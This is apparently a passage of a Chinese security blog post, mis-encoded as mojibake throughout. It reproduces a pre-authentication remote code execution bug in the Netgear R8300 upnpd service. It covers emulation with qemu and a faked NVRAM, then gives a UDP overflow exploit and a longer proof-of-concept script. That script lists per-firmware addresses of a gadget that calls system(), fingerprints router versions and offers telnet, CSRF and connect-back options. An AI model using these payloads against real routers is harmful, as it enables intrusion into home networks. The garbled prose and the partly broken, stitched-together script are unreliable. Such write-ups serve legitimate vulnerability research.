alt></p><p>è§£å†³æ–¹æ³•ï¼šåœ¨libç›®å½•ä¸‹æœ‰libc.so.0ï¼Œåˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ln -s libc.so.0 libc.so.6</span><br></pre></td></tr></table></figure><p>å†æ¬¡è¿è¡Œæç¤º</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/errordlsym.png" alt></p><p>æŸ¥æ‰¾<code>dlsym</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo grep -r &quot;dlsym&quot; .</span><br><span class="line">$ readelf -a ./lib/libdl.so.0 | grep dlsym</span><br><span class="line">    26: 000010f0   296 FUNC    GLOBAL DEFAULT    7 dlsym</span><br></pre></td></tr></table></figure><p>å†æ¬¡è¿è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chroot ./ ./qemu-arm-static -E LD_PRELOAD=&quot;nvram.so ./lib/libdl.so.0&quot; ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><p>æ ¹æ®æŠ¥é”™åˆ›å»ºæ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ touch ./tmp/nvram.ini</span><br></pre></td></tr></table></figure><p>ç„¶åç»§ç»­ä¿®æ”¹nvramé…ç½® åœ¨<code>./tmp/nvram.ini</code>ä¸­æ·»åŠ é…ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">upnpd_debug_level=9</span><br><span class="line">lan_ipaddr=192.168.65.1</span><br><span class="line">hwrev=MP1T99</span><br><span class="line">hwver=R8500</span><br><span class="line">friendly_name=R8300</span><br><span class="line">upnp_enable=1</span><br><span class="line">upnp_turn_on=1</span><br><span class="line">upnp_advert_period=30</span><br><span class="line">upnp_advert_ttl=4</span><br><span class="line">upnp_portmap_entry=1</span><br><span class="line">upnp_duration=3600</span><br><span class="line">upnp_DHCPServerConfigurable=1</span><br><span class="line">wps_is_upnp=0</span><br><span class="line">upnp_sa_uuid=00000000000000000000</span><br><span class="line">lan_hwaddr=AA:BB:CC:DD:EE:FF</span><br></pre></td></tr></table></figure><ul><li>æ³•äºŒ</li></ul><blockquote><p><a href="https://github.com/zcutlip/nvram-faker" target="_blank" rel="noopener">https://github.com/zcutlip/nvram-faker</a></p><p><a href="https://github.com/firmadyne/libnvramâ­" target="_blank" rel="noopener">https://github.com/firmadyne/libnvramâ­</a></p></blockquote><p>ç¼–è¯‘è¿è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// æˆ‘å°†libnvramçš„makefileæ–‡ä»¶ä¸­çš„CCè®¾ç½®ä¸º arm-linux-gcc</span><br><span class="line">$ ./Makefile </span><br><span class="line">$ make</span><br><span class="line">$ cp libnvram.so ~/iot/_R8300-V1.0.2.130_1.0.99.chk.extracted/squashfs-root/firmadyne/libnvram.so</span><br><span class="line">// åœ¨squashfs-rootç›®å½•ä¸‹</span><br><span class="line">$ mkdir -p /firmadyne/libnvram/ </span><br><span class="line">$ mkdir -p /firmadyne/libnvram.override/</span><br></pre></td></tr></table></figure><p>å†æ¬¡è¿è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo chroot . ./qemu-arm-static -E LD_PRELOAD=./firmadyne/libnvram.so ./usr/sbin/upnpd</span><br></pre></td></tr></table></figure><p>æ ¹æ®ç¼ºå°‘çš„é…ç½® è¿›è¡Œè¡¥å…¨ï¼Œè§é™„å½•<code>1_config.h</code></p><p>è¾“å‡ºçš„ä¿¡æ¯ä¼šå‘ç°ï¼ŒIPæ€»è¢«åŠ«æŒä¸º0000ï¼Œå°†<code>/usr/lib/libnvram.so</code> æ›¿æ¢æˆæˆ‘ä»¬ç¼–è¯‘çš„libnvram.soå³å¯â€¦ä¹Ÿä¸éœ€è¦ld_preloadé™„åŠ è°ƒè¯•äº†ã€‚</p><blockquote><p><a href="http://mrbelieve.tech/2020/10/19/Netgear%20Nighthawk%20R8300%20upnpd%20PreAuth%20RCE%20%E5%A4%8D%E7%8E%B0%E8%BE%85%E5%8A%A9/#qemu-user-mode%E6%A8%A1%E6%8B%9F_" target="_blank" rel="noopener">Netgear Nighthawk R8300 upnpd PreAuth RCE å¤ç°è¾…åŠ©</a></p><p><a href="https://www.anquanke.com/post/id/215428" target="_blank" rel="noopener">https://www.anquanke.com/post/id/215428</a></p></blockquote><h1 id="sys-mod"><a href="#sys-mod" class="headerlink" title="sys mod"></a>sys mod</h1><p>åŒä¸Šæ³•ä¸€ è¿è¡ŒæˆåŠŸ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># LD_PRELOAD=&apos;./nvram.so /lib/libdl.so.0&apos; /usr/sbin/upnpd</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/runsuccess.png" alt></p><p>å¼€å§‹è¿œç¨‹è°ƒè¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ./gdbserver --attach 192.168.65.2:1234 $(ps|grep upnpd|grep -v grep|awk &apos;&#123;print $1&#125;&apos;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ gdb-multiarch</span><br><span class="line">pwndbg&gt; set architecture arm</span><br><span class="line">The target architecture is assumed to be arm</span><br><span class="line">pwndbg&gt; target remote 192.168.65.2:1234</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## exp.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">p32 = <span class="keyword">lambda</span> x: struct.pack(<span class="string">"&lt;L"</span>, x)</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">payload = (</span><br><span class="line">    <span class="number">0x604</span> * <span class="string">b'a'</span> + <span class="comment"># 0x7eb1d5ec</span></span><br><span class="line">p32(<span class="number">0x7eb1d5ec</span>) +  <span class="comment"># v51</span></span><br><span class="line">    (<span class="number">0x634</span> - <span class="number">0x604</span> - <span class="number">8</span>) * <span class="string">b'a'</span> +</span><br><span class="line">    p32(<span class="number">0x43434343</span>)  <span class="comment"># PC</span></span><br><span class="line">)</span><br><span class="line">s.connect((<span class="string">'192.168.65.2'</span>, <span class="number">1900</span>))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡ç›´æ¥è¿è¡Œpython exp.pyå‘ç°</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/failgdb.png" alt></p><p>å†æ¬¡è°ƒè¯•è¿è¡Œï¼Œè¿è¡Œå‡ºç°upnp_turn_on=1åå†æ‰§è¡Œè„šæœ¬å‡ºç°é”™è¯¯</p><p><img src="https://raw.githubusercontent.com/p1Kk/blogImg/master/Picture/successgdb.png" alt></p><h2 id="æ¢æµ‹ç›®æ ‡ç‰ˆæœ¬"><a href="#æ¢æµ‹ç›®æ ‡ç‰ˆæœ¬" class="headerlink" title="æ¢æµ‹ç›®æ ‡ç‰ˆæœ¬"></a>æ¢æµ‹ç›®æ ‡ç‰ˆæœ¬</h2><p><a href="https://github.com/grimm-co/NotQuite0DayFriday" target="_blank" rel="noopener">https://github.com/grimm-co/NotQuite0DayFriday</a>  </p><h1 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line">import SimpleHTTPServer</span><br><span class="line">import SocketServer</span><br><span class="line">import argparse</span><br><span class="line">import collections</span><br><span class="line">import os</span><br><span class="line">import shutil</span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">address_info = &#123;</span><br><span class="line">&quot;R8300&quot; : &#123;</span><br><span class="line"># 0) gadget: calls system($sp)</span><br><span class="line">&quot;1.0.2.130&quot; : 0x35B18,</span><br><span class="line">&quot;1.0.2.128&quot; : 0x35B18,</span><br><span class="line">&quot;1.0.2.122&quot; : 0x355fc,</span><br><span class="line">&quot;1.0.2.116&quot; : 0x35258,</span><br><span class="line">&quot;1.0.2.106&quot; : 0x34f40,</span><br><span class="line">&quot;1.0.2.100&quot; : 0x34d38,</span><br><span class="line">&quot;1.0.2.94&quot;  : 0x34d8c,</span><br><span class="line">&quot;1.0.2.86&quot;  : 0x348b8,</span><br><span class="line">&quot;1.0.2.80&quot;  : 0x348b8,</span><br><span class="line">&quot;1.0.2.48&quot;  : 0x340b8,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">firmware_version_to_human_version = &#123;</span><br><span class="line">&quot;R8300&quot; : &#123;</span><br><span class="line"># These version strings may be slightly off. Versions 1.0.2.128 and 1.0.2.130 only used</span><br><span class="line"># the short versions, rather than the full version string like other models.</span><br><span class="line">&quot;V1.0.2.130&quot;        : &quot;1.0.2.130&quot;,</span><br><span class="line">&quot;V1.0.2.128&quot;        : &quot;1.0.2.128&quot;,</span><br><span class="line">&quot;V1.0.2.122_1.0.94&quot; : &quot;1.0.2.122&quot;,</span><br><span class="line">&quot;V1.0.2.116_1.0.90&quot; : &quot;1.0.2.116&quot;,</span><br><span class="line">&quot;V1.0.2.106_1.0.85&quot; : &quot;1.0.2.106&quot;,</span><br><span class="line">&quot;V1.0.2.100_1.0.82&quot; : &quot;1.0.2.100&quot;,</span><br><span class="line">&quot;V1.0.2.94_1.0.79&quot;  : &quot;1.0.2.94&quot;,</span><br><span class="line">&quot;V1.0.2.86_1.0.75&quot;  : &quot;1.0.2.86&quot;,</span><br><span class="line">&quot;V1.0.2.80_1.0.71&quot;  : &quot;1.0.2.80&quot;,</span><br><span class="line">&quot;V1.0.2.48_1.0.52&quot;  : &quot;1.0.2.48&quot;,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ftp_devices = &#123;&quot;WNR3500&quot; : &quot;arm_lsb&quot;, &quot;WNCE3001&quot; : &quot;mips_msb&quot;&#125;</span><br><span class="line"></span><br><span class="line">def send(ip, port, is_https, payload, keep_open = False):</span><br><span class="line">if is_https:</span><br><span class="line">return send_ssl(ip, port, payload, keep_open)</span><br><span class="line">else:</span><br><span class="line">return send_plain(ip, port, payload, keep_open)</span><br><span class="line"></span><br><span class="line">def send_plain(ip, port, payload, keep_open):</span><br><span class="line">sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">sock.connect((ip, port))</span><br><span class="line">sock.send(payload)</span><br><span class="line">if keep_open:</span><br><span class="line">return sock</span><br><span class="line">sock.close()</span><br><span class="line"></span><br><span class="line">def send_ssl(ip, port, payload, keep_open):</span><br><span class="line">import ssl</span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">wrappedSocket = ssl.wrap_socket(sock)</span><br><span class="line">wrappedSocket.connect((ip, port))</span><br><span class="line">wrappedSocket.send(payload)</span><br><span class="line">if keep_open:</span><br><span class="line">return wrappedSocket</span><br><span class="line">wrappedSocket.close()</span><br><span class="line"></span><br><span class="line">def find_item(contents, start_string):</span><br><span class="line">start = contents.find(start_string)</span><br><span class="line">if(start == -1):</span><br><span class="line">print(&quot;Failed to automatically detect version.&quot;)</span><br><span class="line">sys.exit(1)</span><br><span class="line"></span><br><span class="line">start += len(start_string)</span><br><span class="line">end = contents.find(&quot;\r\n&quot;, start)</span><br><span class="line">return contents[start:end].upper() # upper just in case</span><br><span class="line"></span><br><span class="line">def detect_model_version(ip, port, is_https):</span><br><span class="line">request = &quot;GET /currentsetting.htm HTTP/1.1\r\nHost: &#123;&#125;\r\n\r\n&quot;.format(ip)</span><br><span class="line">sock = send(ip, port, is_https, request, True)</span><br><span class="line"></span><br><span class="line">contents = &quot;&quot;</span><br><span class="line">while contents.find(&quot;InternetConnectionStatus&quot;) == -1 and contents.find(&quot;401 Unauthorized&quot;) == -1:</span><br><span class="line">contents += sock.recv(1)</span><br><span class="line"></span><br><span class="line"># Some older models/versions don&apos;t have the currentsetting.htm page, or it&apos;s protected by login</span><br><span class="line">if contents.find(&quot;401 Unauthorized&quot;) != -1:</span><br><span class="line">print(&quot;Version detection against this router is not possible using currentsetting.htm.&quot;)</span><br><span class="line">print(&quot;Received response:\n&#123;&#125;\n&quot;.format(contents))</span><br><span class="line">sys.exit(1)</span><br><span class="line"></span><br><span class="line">model = find_item(contents, &quot;Model=&quot;)</span><br><span class="line">firmware_version = find_item(contents, &quot;Firmware=&quot;)</span><br><span class="line"></span><br><span class="line">if (model not in firmware_version_to_human_version.keys() or</span><br><span class="line">firmware_version not in firmware_version_to_human_version[model]):</span><br><span class="line">print(&quot;Unknown model and version: &#123;&#125; &#123;&#125;&quot;.format(model, firmware_version))</span><br><span class="line">sys.exit(1)</span><br><span class="line"></span><br><span class="line">return model, firmware_version_to_human_version[model][firmware_version]</span><br><span class="line"></span><br><span class="line">def main(args):</span><br><span class="line"># find version</span><br><span class="line">if args.version == &quot;&quot; or args.model == &quot;&quot;:</span><br><span class="line">if args.csrf:</span><br><span class="line">print(&quot;The model and version cannot be automatically determined in CSRF mode.&quot;)</span><br><span class="line">sys.exit(1)</span><br><span class="line">args.model, args.version = detect_model_version(args.ip, args.port, args.https)</span><br><span class="line">print(&quot;Automatically detected model &#123;&#125; and version &#123;&#125;&quot;.format(args.model, args.version))</span><br><span class="line"></span><br><span class="line"># prove</span><br><span class="line">p32 = lambda x: struct.pack(&quot;&lt;L&quot;, x)</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">payload = (</span><br><span class="line">0x604 * b&apos;a&apos; + # 0x7eb1d5ec</span><br><span class="line">p32(0x7eb1d5ec) +  # v51</span><br><span class="line">(0x634 - 0x604 - 8) * b&apos;a&apos; +</span><br><span class="line">p32(0x43434343)  # PC</span><br><span class="line">)</span><br><span class="line">s.connect((&apos;192.168.65.2&apos;, 1900))</span><br><span class="line">s.send(payload)</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">parser = argparse.ArgumentParser(description=&apos;Run the exploit&apos;)</span><br><span class="line">parser.add_argument(&apos;ip&apos;, type=str, default=None, help=&apos;The IP address of the webserver to exploit&apos;)</span><br><span class="line">parser.add_argument(&apos;-command&apos;, type=str, default=&quot;START_TELNET&quot;, help=&apos;The command to run; default is to start telnet on port 8888 (or 3333 if 8888 is already used)&apos;)</span><br><span class="line">parser.add_argument(&apos;-csrf&apos;, required=False, action=&apos;store_true&apos;, help=&apos;Run a web server that sends the exploit as a CSRF payload&apos;)</span><br><span class="line">parser.add_argument(&apos;-https&apos;, required=False, action=&apos;store_true&apos;, help=&apos;Run the exploit against a webserver running HTTPS&apos;)</span><br><span class="line">parser.add_argument(&apos;-file&apos;, required=False, action=&apos;store_true&apos;, help=&apos;Write the exploit firmware to a file (which typically&apos;</span><br><span class="line">+ &apos; has a file extension .chk). Use the ip argument to specify the filename.&apos;)</span><br><span class="line">parser.add_argument(&apos;-port&apos;, type=int, default=80, help=&apos;The port of the webserver to exploit&apos;)</span><br><span class="line">parser.add_argument(&apos;-model&apos;, type=str, default=&quot;&quot;, help=&apos;The model of the webserver to exploit (default autodetect).&apos;</span><br><span class="line">+ &apos; Supported models are: &#123;&#125;&apos;.format(&quot;, &quot;.join(address_info.keys())))</span><br><span class="line">parser.add_argument(&apos;-version&apos;, type=str, default=&quot;&quot;, help=&apos;The version of the webserver to exploit (default autodetect).&apos;</span><br><span class="line">+ &apos; Supported versions are: &#123;&#125;&apos;.format(&quot;; &quot;.join([&quot;&#123;&#125;: &#123;&#125;&quot;.format(x, &quot;, &quot;.join(address_info[x])) for x in address_info.keys()])))</span><br><span class="line">parser.add_argument(&apos;-local_ip&apos;, type=str, default=&quot;&quot;, help=&apos;The IP address the exploited host should connect back to download a&apos;</span><br><span class="line">+ &apos; payload, only used on the devices: &#123;&#125; (default autodetect).&apos;.format(&quot;, &quot;.join(ftp_devices.keys())))</span><br><span class="line">parser.add_argument(&apos;-version-only&apos;, required=False, action=&apos;store_true&apos;, help=&quot;Only detect the model/version of a device, don&apos;t exploit&quot;)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line">args.model = args.model.upper()</span><br><span class="line"></span><br><span class="line">main(args)</span><br></pre></td></tr></table></figure><p>è„šæœ¬è¿˜æœ‰ç‚¹å„¿é—®é¢˜</p><h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><h2 id="è·å–ARMæ¶æ„çš„libc-so-6æ–‡ä»¶æ–¹æ³•"><a href="#è·å–ARMæ¶æ„çš„libc-so-6æ–‡ä»¶æ–¹æ³•" class="headerlink" title="è·å–ARMæ¶æ„çš„libc.so.6æ–‡ä»¶æ–¹æ³•"></a><a href="https://www.cnblogs.com/from-zero/p/12606867.html" target="_blank" rel="noopener">è·å–ARMæ¶æ„çš„libc.so.6æ–‡ä»¶æ–¹æ³•</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ apt-cache search libc6 | grep armel</span><br><span class="line">$ sudo apt-get install libc6-armel-crossã€ä¸¾ä¾‹ã€‘</span><br><span class="line">å…±äº«åº“ç›®å½•</span><br><span class="line">/usr/arm-linux-gnueabi</span><br></pre></td></tr></table></figure><h1 id="é™„å½•"><a href="#é™„å½•" class="headerlink" title="é™„å½•"></a>é™„å½•</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"># 1_config.h</span><br><span class="line"></span><br><span class="line">#ifndef INCLUDE_CONFIG_H</span><br><span class="line">#define INCLUDE_CONFIG_H</span><br><span class="line"></span><br><span class="line">// Determines whether debugging information should be printed to stderr.</span><br><span class="line">#define DEBUG               1</span><br><span class="line">// Determines the size of the internal buffer, used for manipulating and storing key values, etc.</span><br><span class="line">#define BUFFER_SIZE         256</span><br><span class="line">// Determines the size of the &quot;emulated&quot; NVRAM, used by nvram_get_nvramspace().</span><br><span class="line">#define NVRAM_SIZE          2048</span><br><span class="line">// Determines the maximum size of the user-supplied output buffer when a length is not supplied.</span><br><span class="line">#define USER_BUFFER_SIZE    64</span><br><span class="line">// Determines the unique separator character (as string) used for the list implementation. Do not use &quot;\0&quot;.</span><br><span class="line">#define LIST_SEP            &quot;\xff&quot;</span><br><span class="line">// Special argument used to change the semantics of the nvram_list_exist() function.</span><br><span class="line">#define LIST_MAGIC          0xdeadbeef</span><br><span class="line">// Identifier value used to generate IPC key in ftok()</span><br><span class="line">#define IPC_KEY             &apos;A&apos;</span><br><span class="line">// Timeout for the semaphore</span><br><span class="line">#define IPC_TIMEOUT         1000</span><br><span class="line">// Mount point of the base NVRAM implementation.</span><br><span class="line">#define MOUNT_POINT         &quot;/firmadyne/libnvram/&quot;</span><br><span class="line">// Location of NVRAM override values that are copied into the base NVRAM implementation.</span><br><span class="line">#define OVERRIDE_POINT      &quot;/firmadyne/libnvram.override/&quot;</span><br><span class="line"></span><br><span class="line">// Define the semantics for success and failure error codes.</span><br><span class="line">#define E_FAILURE  0</span><br><span class="line">#define E_SUCCESS  1</span><br><span class="line"></span><br><span class="line">// Default paths for NVRAM default values.</span><br><span class="line">#define NVRAM_DEFAULTS_PATH \</span><br><span class="line">    /* &quot;DIR-505L_FIRMWARE_1.01.ZIP&quot; (10497) */ \</span><br><span class="line">    PATH(&quot;/var/etc/nvram.default&quot;) \</span><br><span class="line">    /* &quot;DIR-615_REVE_FIRMWARE_5.11.ZIP&quot; (9753) */ \</span><br><span class="line">    PATH(&quot;/etc/nvram.default&quot;) \</span><br><span class="line">    /* &quot;DGL-5500_REVA_FIRMWARE_1.12B05.ZIP&quot; (9469) */ \</span><br><span class="line">    TABLE(router_defaults) \</span><br><span class="line">    PATH(&quot;/etc/nvram.conf&quot;) \</span><br><span class="line">    PATH(&quot;/etc/nvram.deft&quot;) \</span><br><span class="line">    PATH(&quot;/etc/nvram.update&quot;) \</span><br><span class="line">    TABLE(Nvrams) \</span><br><span class="line">    PATH(&quot;/etc/wlan/nvram_params&quot;) \</span><br><span class="line">    PATH(&quot;/etc/system_nvram_defaults&quot;)</span><br><span class="line"></span><br><span class="line">// Default values for NVRAM.</span><br><span class="line">#define NVRAM_DEFAULTS \</span><br><span class="line">/* Used by Netgear router: enable upnpd log */\</span><br><span class="line">ENTRY(&quot;upnpd_debug_level&quot;, nvram_set, &quot;4&quot;)\</span><br><span class="line">/* Used by &quot;Netgear R8300&quot; */ \</span><br><span class="line">    ENTRY(&quot;hwrev&quot;, nvram_set, &quot;R8500&quot;)\</span><br><span class="line">    ENTRY(&quot;friendly_name&quot;, nvram_set, &quot;R8300&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_enable&quot;, nvram_set, &quot;1&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_turn_on&quot;, nvram_set, &quot;1&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_advert_period&quot;, nvram_set, &quot;30&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_advert_ttl&quot;, nvram_set, &quot;4&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_portmap_entry&quot;, nvram_set, &quot;1&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_duration&quot;, nvram_set, &quot;3600&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_DHCPServerConfigurable&quot;, nvram_set, &quot;1&quot;)\</span><br><span class="line">    ENTRY(&quot;wps_is_upnp&quot;, nvram_set, &quot;0&quot;)\</span><br><span class="line">    ENTRY(&quot;upnp_sa_uuid&quot;, nvram_set, &quot;00000000000000000000&quot;)\</span><br><span class="line">    ENTRY(&quot;lan_hwaddr&quot;, nvram_set, &quot;AA:BB:CC:DD:EE:FF&quot;)\</span><br><span class="line">    \</span><br><span class="line">    /* Linux kernel log level, used by &quot;WRT54G3G_2.11.05_ETSI_code.bin&quot; (305) */ \</span><br><span class="line">    ENTRY(&quot;console_loglevel&quot;, nvram_set, &quot;7&quot;) \</span><br><span class="line">    /* Reset NVRAM to default at bootup, used by &quot;WNR3500v2-V1.0.2.10_23.0.70NA.chk&quot; (1018) */ \</span><br><span class="line">    ENTRY(&quot;restore_defaults&quot;, nvram_set, &quot;1&quot;) \</span><br><span class="line">    ENTRY(&quot;sku_name&quot;, nvram_set, &quot;&quot;) \</span><br><span class="line">    ENTRY(&quot;wla_wlanstate&quot;, 